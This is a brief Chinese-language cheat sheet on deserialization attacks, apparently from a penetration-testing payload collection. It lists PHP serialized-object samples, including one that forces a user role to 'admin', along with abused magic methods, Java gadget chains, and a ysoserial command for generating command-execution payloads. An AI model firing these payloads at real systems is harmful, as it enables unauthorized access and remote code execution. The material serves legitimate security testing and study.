# 反序列化漏洞

适用于 Cookie、POST 数据、API 参数中包含序列化对象的场景。

## PHP 反序列化

- O:8:StdClass:0:{} (示例)
- O:4:User:2:{s:4:name;s:5:admin;s:4:role;s:5:admin;}
- a:2:{i:0;s:4:test;i:1;s:4:test;}

常用魔术方法:
- __destruct()
- __wakeup()
- __toString()
- __call()

## Java 反序列化

- 常见利用链：CommonsCollections、Spring、Fastjson
- 可使用 ysoserial 生成 payload:
  java -jar ysoserial.jar CommonsCollections5 'command' | base64

**注意**: 使用时根据目标库选择对应 Gadget。